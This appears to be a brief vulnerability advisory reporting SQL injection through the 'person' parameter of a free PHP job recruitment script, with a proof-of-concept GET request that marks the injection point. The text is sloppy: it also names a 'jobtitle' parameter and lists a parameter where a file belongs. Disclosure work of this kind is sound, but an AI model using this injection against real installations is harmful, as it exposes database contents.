# job-recruitment-in-php has sql injection vulnerability via  $person paremeter.

## supplier 
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
$person paremeter.

## describe

There is a sql injection vulnerability in the system.  The parameters that can be controlled:  $person parameter. This function executes the jobtitle parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analysis**    

When the parameter value of   $person is obtained in the function, it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

## ![image-20250101150203869](https://github.com/user-attachments/assets/b6515ac8-3f12-46fc-bbcc-a290a4fc164c)

## POC

```
GET /_parse/_feedback_system.php?person=1* HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=m7q8msl7hl8db479mmmo0vuav1
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

![image-20250101151348839](https://github.com/user-attachments/assets/5e732e66-808a-48dc-b088-6614c2c3fa78)



**Discover**

西安电子科技大学： 李腾，谢亚轩，刘芮彤